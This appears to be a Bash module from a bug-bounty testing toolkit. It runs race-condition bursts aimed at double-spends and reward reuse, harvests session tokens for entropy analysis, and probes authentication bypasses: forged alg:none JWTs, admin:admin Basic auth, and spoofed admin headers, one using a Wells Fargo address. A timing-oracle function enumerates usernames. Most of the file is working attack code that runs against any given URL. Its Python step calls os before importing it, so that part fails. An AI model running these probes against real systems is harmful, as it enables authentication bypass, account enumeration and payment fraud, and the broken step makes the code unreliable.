#!/bin/bash
# ============================================================
# Module 03: Ghost Auth & Logic Testing
# ============================================================
# Behavioral testing that scanners CANNOT do:
#
# 1. Race Condition Detector - concurrent requests for state bugs
# 2. Token Entropy Analyzer - weak randomness in session/CSRF tokens
# 3. State Machine Analyzer - break multi-step flows
# 4. Auth Header Manipulation - find bypasses via header tricks
# 5. Session Puzzle Testing - fixation, confusion, cross-context
# ============================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/core.sh"
source "${SCRIPT_DIR}/../../lib/config.sh"


# ============================================================
# 1. Race Condition Detector
# ============================================================
# Send N identical requests simultaneously to find:
# - Double-spend on transfers/payments
# - Multiple coupon/reward redemptions
# - Bypass rate limits via race
# - Create duplicate resources
# Uses curl parallel + background processes

ghost_race_condition() {
    local url="$1"
    local method="${2:-POST}"
    local body="${3:-}"
    local concurrent="${4:-10}"
    local output_dir="${GHOST_OUTPUT}/auth/race-condition"
    mkdir -p "$output_dir"

    ghost_log phase "Race Condition Testing"
    ghost_log info "Target: ${url}"
    ghost_log info "Concurrent requests: ${concurrent}"
    ghost_log warn "NOTE: Only test on YOUR OWN accounts!"

    local race_dir="${output_dir}/$(date +%s)"
    mkdir -p "$race_dir"

    # Method 1: Background curl processes (true concurrency)
    ghost_log info "Launching ${concurrent} simultaneous requests..."

    local pids=()
    for ((i=1; i<=concurrent; i++)); do
        local outfile="${race_dir}/response_${i}.txt"
        local timefile="${race_dir}/timing_${i}.txt"

        curl -s -X "$method" "$url" \
            -H "${H1_HEADER}" \
            -H "${TOOL_HEADER_PREFIX}: ghost-race" \
            -H "Content-Type: application/json" \
            ${body:+-d "$body"} \
            -w "\n---TIMING---\nhttp_code:%{http_code}\ntime_total:%{time_total}\nsize:%{size_download}" \
            -o "$outfile" \
            --max-time 10 \
            2>/dev/null &
        pids+=($!)
    done

    # Wait for all to complete
    for pid in "${pids[@]}"; do
        wait "$pid" 2>/dev/null
    done

    ghost_log info "All requests completed. Analyzing responses..."

    # Analyze: look for inconsistencies
    local statuses=()
    local sizes=()
    local success_count=0

    for ((i=1; i<=concurrent; i++)); do
        local outfile="${race_dir}/response_${i}.txt"
        if [[ -f "$outfile" ]]; then
            local status=$(grep "http_code:" "$outfile" 2>/dev/null | cut -d: -f2)
            local size=$(grep "size:" "$outfile" 2>/dev/null | cut -d: -f2)
            statuses+=("$status")
            sizes+=("$size")
            [[ "$status" == "200" || "$status" == "201" ]] && success_count=$((success_count+1))
        fi
    done

    ghost_log info "Results: ${success_count}/${concurrent} successful (200/201)"

    # If ALL succeed where only 1 should = race condition!
    if [[ $success_count -gt 1 ]]; then
        ghost_log hit "POTENTIAL RACE CONDITION! ${success_count} requests succeeded"
        ghost_finding "high" \
            "Race condition: ${success_count}/${concurrent} parallel requests succeeded" \
            "Multiple concurrent requests to ${url} all returned success. If this is a state-changing operation (transfer, redemption, etc), this indicates a TOCTOU race condition." \
            "Method: ${method}, Success: ${success_count}/${concurrent}"

        # Check if responses are identical or different
        local unique_responses=$(md5sum "${race_dir}"/response_*.txt 2>/dev/null | awk '{print $1}' | sort -u | wc -l)
        ghost_log info "Unique response bodies: ${unique_responses}"
    fi

    # Save summary
    cat > "${race_dir}/summary.txt" << EOF
Race Condition Test Summary
===========================
URL: ${url}
Method: ${method}
Concurrent: ${concurrent}
Successes: ${success_count}/${concurrent}
Statuses: ${statuses[*]}
Verdict: $(if [[ $success_count -gt 1 ]]; then echo "POTENTIAL RACE CONDITION"; else echo "Likely protected"; fi)
EOF

    ghost_log info "Results: ${race_dir}/summary.txt"
}


# ============================================================
# 2. Token Entropy Analyzer
# ============================================================
# Collect multiple tokens (session, CSRF, reset) and analyze:
# - Randomness quality (Shannon entropy)
# - Sequential patterns (predictable generation)
# - Timestamp embedding (time-based tokens)
# - Character set analysis (reduced keyspace)

ghost_token_entropy() {
    local url="$1"
    local token_header="${2:-Set-Cookie}"
    local samples="${3:-20}"
    local output_dir="${GHOST_OUTPUT}/auth/token-entropy"
    mkdir -p "$output_dir"

    ghost_log phase "Token Entropy Analysis"
    ghost_log info "Collecting ${samples} tokens from ${url}..."

    local tokens_file="${output_dir}/collected-tokens.txt"
    > "$tokens_file"

    for ((i=1; i<=samples; i++)); do
        ghost_rate_limit 0.3
        local result=$(ghost_request "$url")
        local header_file=$(echo "$result" | cut -d'|' -f6)
        local body_file=$(echo "$result" | cut -d'|' -f5)

        # Extract token from headers (cookies, CSRF, etc)
        if [[ "$token_header" == "Set-Cookie" ]]; then
            grep -i "set-cookie" "$header_file" 2>/dev/null | \
                grep -oP '(?<==)[^;]+' | head -1 >> "$tokens_file"
        elif [[ "$token_header" == "csrf" ]]; then
            # Try common CSRF patterns in body
            grep -oP '(?:csrf|_token|XSRF)["\s:=]+["'"'"']?([a-zA-Z0-9_\-+/=]+)' \
                "$body_file" 2>/dev/null | head -1 >> "$tokens_file"
        else
            grep -i "$token_header" "$header_file" 2>/dev/null | \
                awk '{print $2}' | tr -d '\r\n' >> "$tokens_file"
            echo "" >> "$tokens_file"
        fi

        rm -f "$body_file" "$header_file" 2>/dev/null
    done

    # Remove empty lines
    sed -i '/^$/d' "$tokens_file" 2>/dev/null || \
        sed '/^$/d' "$tokens_file" > "${tokens_file}.tmp" && mv "${tokens_file}.tmp" "$tokens_file"

    local collected=$(wc -l < "$tokens_file" 2>/dev/null || echo 0)
    ghost_log info "Collected ${collected} tokens"

    if [[ $collected -lt 3 ]]; then
        ghost_log warn "Not enough tokens collected for analysis"
        return
    fi

    # Analyze with Python
    python3 << PYEOF "$tokens_file" "$output_dir"
import sys, math, json
from collections import Counter

tokens_file = sys.argv[1]
out_dir = sys.argv[2]

with open(tokens_file) as f:
    tokens = [line.strip() for line in f if line.strip()]

if len(tokens) < 3:
    print("Not enough tokens")
    sys.exit(0)

results = {"token_count": len(tokens), "findings": []}

# 1. Shannon entropy per token
def shannon_entropy(s):
    if not s:
        return 0
    freq = Counter(s)
    length = len(s)
    return -sum((c/length) * math.log2(c/length) for c in freq.values())

entropies = [shannon_entropy(t) for t in tokens]
avg_entropy = sum(entropies) / len(entropies)
results["avg_entropy"] = round(avg_entropy, 3)
results["min_entropy"] = round(min(entropies), 3)
results["max_entropy"] = round(max(entropies), 3)

# Max possible entropy for the character set
charset = set(''.join(tokens))
max_possible = math.log2(len(charset)) if charset else 0
results["max_possible_entropy"] = round(max_possible, 3)
results["entropy_ratio"] = round(avg_entropy / max_possible, 3) if max_possible > 0 else 0

# Weak if entropy ratio < 0.7
if results["entropy_ratio"] < 0.7:
    results["findings"].append({
        "severity": "high",
        "issue": "Low token entropy",
        "detail": f"Entropy ratio: {results['entropy_ratio']} (threshold: 0.7). Tokens may be predictable."
    })
    print(f"[!] LOW ENTROPY: ratio={results['entropy_ratio']}")

# 2. Length consistency
lengths = [len(t) for t in tokens]
if len(set(lengths)) == 1:
    results["token_length"] = lengths[0]
else:
    results["token_lengths"] = {"min": min(lengths), "max": max(lengths)}

# 3. Character set analysis
results["charset_size"] = len(charset)
results["charset"] = ''.join(sorted(charset))

# Reduced charset = reduced keyspace
if len(charset) < 16:
    results["findings"].append({
        "severity": "medium",
        "issue": "Reduced character set",
        "detail": f"Only {len(charset)} unique characters used. Limited keyspace makes brute-force feasible."
    })
    print(f"[!] REDUCED CHARSET: only {len(charset)} chars")

# 4. Sequential/incremental detection
if all(t.isdigit() for t in tokens):
    nums = [int(t) for t in tokens]
    diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
    if len(set(diffs)) <= 2:
        results["findings"].append({
            "severity": "critical",
            "issue": "Sequential/predictable tokens",
            "detail": f"Tokens are sequential numbers with consistent increments: {set(diffs)}"
        })
        print(f"[!] SEQUENTIAL TOKENS DETECTED!")

# 5. Common prefix/suffix (timestamp embedding)
if len(tokens) >= 3:
    common_prefix = os.path.commonprefix(tokens) if tokens else ""
    if len(common_prefix) > 3:
        results["findings"].append({
            "severity": "medium",
            "issue": "Common prefix in tokens",
            "detail": f"All tokens share prefix: '{common_prefix[:20]}...' - possible timestamp or static component"
        })
        print(f"[!] COMMON PREFIX: '{common_prefix[:20]}'")

# 6. Duplicate detection
if len(tokens) != len(set(tokens)):
    dupes = len(tokens) - len(set(tokens))
    results["findings"].append({
        "severity": "critical",
        "issue": "Duplicate tokens generated",
        "detail": f"{dupes} duplicate tokens in {len(tokens)} samples. Token generation is NOT random."
    })
    print(f"[!] DUPLICATE TOKENS: {dupes} duplicates!")

import os
with open(f"{out_dir}/entropy-analysis.json", 'w') as f:
    json.dump(results, f, indent=2)

print(f"\nEntropy: avg={results['avg_entropy']}, ratio={results['entropy_ratio']}")
print(f"Charset: {len(charset)} chars, Length: {lengths[0] if len(set(lengths))==1 else 'variable'}")
print(f"Findings: {len(results['findings'])}")
PYEOF

    # Report critical findings
    if [[ -f "${output_dir}/entropy-analysis.json" ]]; then
        local finding_count=$(jq '.findings | length' "${output_dir}/entropy-analysis.json" 2>/dev/null || echo 0)
        if [[ $finding_count -gt 0 ]]; then
            ghost_log hit "Token analysis found ${finding_count} issues!"
            jq -r '.findings[] | "  [\(.severity)] \(.issue)"' "${output_dir}/entropy-analysis.json" 2>/dev/null
        else
            ghost_log info "Token entropy looks adequate"
        fi
    fi
}


# ============================================================
# 3. Auth Header Manipulation
# ============================================================
# Test various auth bypass techniques beyond simple 403 bypass:
# - Token downgrade (JWT→none algorithm)
# - Role confusion via claims manipulation
# - Auth header priority (multiple auth headers)
# - Cookie vs Bearer precedence

ghost_auth_manipulation() {
    local url="$1"
    local auth_token="${2:-}"
    local output_dir="${GHOST_OUTPUT}/auth/header-manipulation"
    mkdir -p "$output_dir"

    ghost_log phase "Auth Header Manipulation"

    if [[ -z "$auth_token" ]]; then
        ghost_log warn "No auth token provided. Provide via: ghost_auth_manipulation <url> <token>"
        ghost_log info "Testing unauthenticated bypass techniques only..."
    fi

    local findings_file="${output_dir}/bypass-results.txt"
    > "$findings_file"

    # Test 1: No auth header at all
    ghost_rate_limit 0.2
    local no_auth=$(curl -s -o /dev/null -w '%{http_code}|%{size_download}' \
        -H "${H1_HEADER}" -H "${TOOL_HEADER_PREFIX}: ghost-auth" \
        --max-time 10 "$url" 2>/dev/null)
    echo "no_auth|${no_auth}" >> "$findings_file"

    # Test 2: Empty Authorization header
    ghost_rate_limit 0.2
    local empty_auth=$(curl -s -o /dev/null -w '%{http_code}|%{size_download}' \
        -H "${H1_HEADER}" -H "Authorization: " \
        --max-time 10 "$url" 2>/dev/null)
    echo "empty_auth|${empty_auth}" >> "$findings_file"

    # Test 3: Bearer with empty token
    ghost_rate_limit 0.2
    local empty_bearer=$(curl -s -o /dev/null -w '%{http_code}|%{size_download}' \
        -H "${H1_HEADER}" -H "Authorization: Bearer " \
        --max-time 10 "$url" 2>/dev/null)
    echo "empty_bearer|${empty_bearer}" >> "$findings_file"

    # Test 4: Basic auth with admin:admin
    ghost_rate_limit 0.2
    local basic_auth=$(curl -s -o /dev/null -w '%{http_code}|%{size_download}' \
        -H "${H1_HEADER}" -H "Authorization: Basic YWRtaW46YWRtaW4=" \
        --max-time 10 "$url" 2>/dev/null)
    echo "basic_admin|${basic_auth}" >> "$findings_file"

    # Test 5: JWT with algorithm none (if token provided)
    if [[ -n "$auth_token" && "$auth_token" == eyJ* ]]; then
        # Decode header, set alg to none
        local header_b64=$(echo "$auth_token" | cut -d. -f1)
        local payload_b64=$(echo "$auth_token" | cut -d. -f2)

        # Create alg:none token
        local none_header=$(echo '{"alg":"none","typ":"JWT"}' | base64 -w0 2>/dev/null || echo '{"alg":"none","typ":"JWT"}' | base64 2>/dev/null)
        local none_token="${none_header}.${payload_b64}."

        ghost_rate_limit 0.2
        local jwt_none=$(curl -s -o /dev/null -w '%{http_code}|%{size_download}' \
            -H "${H1_HEADER}" -H "Authorization: Bearer ${none_token}" \
            --max-time 10 "$url" 2>/dev/null)
        echo "jwt_none_alg|${jwt_none}" >> "$findings_file"

        local none_status=$(echo "$jwt_none" | cut -d'|' -f1)
        if [[ "$none_status" == "200" ]]; then
            ghost_finding "critical" \
                "JWT algorithm confusion: none accepted at ${url}" \
                "Server accepts JWT with alg:none. Complete authentication bypass." \
                "Token: ${none_token:0:50}..."
        fi
    fi

    # Test 6: Multiple auth headers (priority confusion)
    ghost_rate_limit 0.2
    local multi_auth=$(curl -s -o /dev/null -w '%{http_code}|%{size_download}' \
        -H "${H1_HEADER}" \
        -H "Authorization: Bearer invalid" \
        -H "X-Auth-Token: admin" \
        -H "X-User-Role: admin" \
        -H "X-Original-User: admin" \
        --max-time 10 "$url" 2>/dev/null)
    echo "multi_headers|${multi_auth}" >> "$findings_file"

    # Test 7: Forwarded auth headers
    ghost_rate_limit 0.2
    local fwd_auth=$(curl -s -o /dev/null -w '%{http_code}|%{size_download}' \
        -H "${H1_HEADER}" \
        -H "X-Forwarded-User: admin" \
        -H "X-Forwarded-Email: admin@wellsfargo.com" \
        -H "X-Remote-User: admin" \
        --max-time 10 "$url" 2>/dev/null)
    echo "forwarded_user|${fwd_auth}" >> "$findings_file"

    # Analyze results
    ghost_log info "Auth manipulation results:"
    while IFS='|' read -r test status size; do
        local indicator=""
        [[ "$status" == "200" ]] && indicator=" ← INVESTIGATE"
        ghost_log info "  ${test}: status=${status} size=${size}${indicator}"

        if [[ "$status" == "200" && "$test" != "no_auth" ]]; then
            ghost_finding "high" \
                "Auth bypass via ${test}: ${url}" \
                "Technique '${test}' returned 200 on protected endpoint" \
                "Status: ${status}, Size: ${size}"
        fi
    done < "$findings_file"
}


# ============================================================
# 4. Response Timing Oracle
# ============================================================
# Detect information leakage via response timing:
# - Valid vs invalid username (login timing difference)
# - Existing vs non-existing resources (enumeration)
# - Correct first N chars of token (char-by-char brute)

ghost_timing_oracle() {
    local url="$1"
    local param_name="${2:-username}"
    local output_dir="${GHOST_OUTPUT}/auth/timing-oracle"
    mkdir -p "$output_dir"

    ghost_log phase "Response Timing Oracle"
    ghost_log info "Testing timing differences on ${url} (param: ${param_name})"

    # Establish baseline with known-invalid value
    local SAMPLES=5
    local invalid_times=()
    
    for ((i=0; i<SAMPLES; i++)); do
        ghost_rate_limit 0.3
        local random_val="ghostinvalid$(head /dev/urandom | tr -dc a-z | head -c 8)"
        local result=$(ghost_request "${url}" "POST" "${param_name}=${random_val}&password=test123" \
            "Content-Type: application/x-www-form-urlencoded")
        local time=$(echo "$result" | cut -d'|' -f2)
        invalid_times+=("$time")
        rm -f "$(echo "$result" | cut -d'|' -f5)" "$(echo "$result" | cut -d'|' -f6)" 2>/dev/null
    done

    # Calculate invalid baseline average
    local invalid_avg=0
    for t in "${invalid_times[@]}"; do
        invalid_avg=$(echo "$invalid_avg + $t" | bc 2>/dev/null || echo "0")
    done
    invalid_avg=$(echo "scale=4; $invalid_avg / $SAMPLES" | bc 2>/dev/null || echo "0")
    
    ghost_log info "Invalid baseline: avg ${invalid_avg}s"

    # Test with potentially valid values
    local test_values=("admin" "administrator" "test" "user" "support" "helpdesk" "api" "system" "root" "service")
    
    for val in "${test_values[@]}"; do
        ghost_rate_limit 0.3
        local result=$(ghost_request "${url}" "POST" "${param_name}=${val}&password=invalidpass123" \
            "Content-Type: application/x-www-form-urlencoded")
        local time=$(echo "$result" | cut -d'|' -f2)
        local status=$(echo "$result" | cut -d'|' -f1)
        
        # Calculate deviation from baseline
        local deviation=$(echo "scale=4; $time - $invalid_avg" | bc 2>/dev/null || echo "0")
        local abs_dev=$(echo "$deviation" | tr -d '-')
        
        # If timing differs by >30% from baseline, it's suspicious
        local threshold=$(echo "scale=4; $invalid_avg * 0.3" | bc 2>/dev/null || echo "0.1")
        
        local flag=""
        if (( $(echo "$abs_dev > $threshold" | bc -l 2>/dev/null || echo 0) )); then
            flag=" ← TIMING DIFFERENCE"
            ghost_log hit "${param_name}=${val}: ${time}s (deviation: ${deviation}s)${flag}"
            echo "${val}|${time}|${deviation}|${status}" >> "${output_dir}/timing-anomalies.txt"
        fi
        
        echo "${val}|${time}|${deviation}|${status}" >> "${output_dir}/timing-all.txt"
        rm -f "$(echo "$result" | cut -d'|' -f5)" "$(echo "$result" | cut -d'|' -f6)" 2>/dev/null
    done

    if [[ -s "${output_dir}/timing-anomalies.txt" ]]; then
        ghost_finding "medium" \
            "Timing oracle detected on ${url}" \
            "Response times differ for valid vs invalid ${param_name} values. Enables user enumeration." \
            "Baseline: ${invalid_avg}s, Anomalies: $(wc -l < "${output_dir}/timing-anomalies.txt")"
    fi
}

# ============================================================
# Main Auth Runner
# ============================================================
ghost_auth_run() {
    local target_url="${1:-}"
    local auth_token="${2:-}"

    ghost_log phase "GHOST AUTH & LOGIC MODULE"

    if [[ -z "$target_url" ]]; then
        ghost_log error "Usage: ghost_auth_run <target_url> [auth_token]"
        return 1
    fi

    ghost_auth_manipulation "$target_url" "$auth_token"
    ghost_timing_oracle "$target_url"

    ghost_log phase "AUTH ANALYSIS COMPLETE"
    ghost_log info "For race condition testing, call:"
    ghost_log info "  ghost_race_condition <url> POST '{\"amount\":1}' 10"
    ghost_log info "For token entropy, call:"
    ghost_log info "  ghost_token_entropy <login_url> Set-Cookie 20"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    ghost_auth_run "$@"
fi
